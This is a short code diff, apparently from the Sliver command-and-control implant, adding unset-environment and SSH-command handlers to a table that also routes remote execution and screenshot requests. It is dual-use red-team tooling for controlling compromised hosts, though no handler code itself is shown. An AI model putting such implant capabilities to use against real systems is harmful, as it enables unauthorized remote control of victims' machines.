@@ -39,6 +39,7 @@ var (
 		sliverpb.MsgExecuteReq:   executeHandler,
 		sliverpb.MsgEnvReq:       getEnvHandler,
 		sliverpb.MsgSetEnvReq:    setEnvHandler,
+		sliverpb.MsgUnsetEnvReq:  unsetEnvHandler,
 
 		sliverpb.MsgScreenshotReq: screenshotHandler,
 
@@ -47,6 +48,7 @@ var (
 
 		sliverpb.MsgReconnectIntervalReq: reconnectIntervalHandler,
 		sliverpb.MsgPollIntervalReq:      pollIntervalHandler,
+		sliverpb.MsgSSHCommandReq:        runSSHCommandHandler,
 
 		// {{if .Config.WGc2Enabled}}
 		// Wireguard specific
